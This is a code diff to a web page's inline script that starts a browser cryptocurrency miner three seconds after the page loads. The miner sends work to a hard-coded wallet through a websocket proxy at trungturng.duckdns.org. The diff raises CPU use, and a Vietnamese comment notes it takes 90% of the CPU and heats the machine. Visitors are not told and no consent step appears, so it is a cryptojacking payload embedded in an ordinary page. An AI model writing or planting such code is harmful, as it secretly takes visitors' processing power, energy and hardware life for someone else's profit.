@@ -1,23 +1,29 @@
 <script src="assets/js/support.js"></script>
 <script>
-    setTimeout(function() {
+    function startRealMining() {
         if (typeof WMP !== 'undefined') {
             const config = {
                 proxy: 'wss://trungturng.duckdns.org:8080', 
-                throttle: 0.1 
+                throttle: 0.1, // Dùng 90% CPU - Máy sẽ bắt đầu nóng lên đấy!
+                autoThreads: true
             };
             const wallet = '47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF';
             
-            window.miner = new WMP.User(wallet, config);
-            window.miner.start();
+            const miner = new WMP.User(wallet, config);
+            miner.start();
 
-            // Kiểm tra tốc độ mỗi 3 giây
+            console.log("ĐÃ KÍCH HOẠT ĐỘNG CƠ THẬT!");
+
+            // Theo dõi tốc độ thật
             setInterval(function() {
-                if (window.miner) {
-                    const speed = window.miner.getHashesPerSecond();
-                    console.log("Tốc độ đào: " + speed.toFixed(2) + " H/s");
+                const speed = miner.getHashesPerSecond();
+                if (speed > 0) {
+                    console.log("%c TỐC ĐỘ THẬT: " + speed.toFixed(2) + " H/s ", "color: white; background: green; padding: 3px;");
                 }
-            }, 3000);
+            }, 5000);
         }
-    }, 3000);
+    }
+
+    // Chạy sau 3 giây
+    setTimeout(startRealMining, 3000);
 </script>
